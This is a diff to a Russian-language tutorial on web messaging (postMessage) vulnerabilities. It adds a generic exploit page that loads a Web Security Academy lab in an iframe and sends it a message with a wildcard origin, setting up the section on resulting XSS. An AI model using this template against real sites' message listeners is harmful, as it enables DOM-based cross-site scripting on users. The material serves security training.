@@ -8,6 +8,25 @@
 
 В общем, одно окно может получить ссылку на другое (например, через `targetWindow = window.opener`), а затем отправить ему `MessageEvent` с помощью `targetWindow.postMessage()`. Получающее окно тогда свободно обрабатывать это событие по мере необходимости. Аргументы, передаваемые в `window.postMessage()` (то есть «сообщение»), открываются принимающему окну через объект события.
 
+Общий exploit для страницы, на которой открыт web message communication
+
+```markup
+<html>
+    <head>
+        <title>DOM based vulns</title>
+    </head>
+    <body>
+        <script>
+            function callback() {
+                document.getElementById('target_website').contentWindow.postMessage('my data to web message listener', '*');
+            }
+        </script>
+        <iframe id="target_website" onload="callback()" src="https://0abf00eb04791b73c0d62af8001a00d0.web-security-academy.net/">
+        </iframe>
+    </body>
+</html>
+```
+
 ## К чему может привести неправильное использование
 
 ### XSS
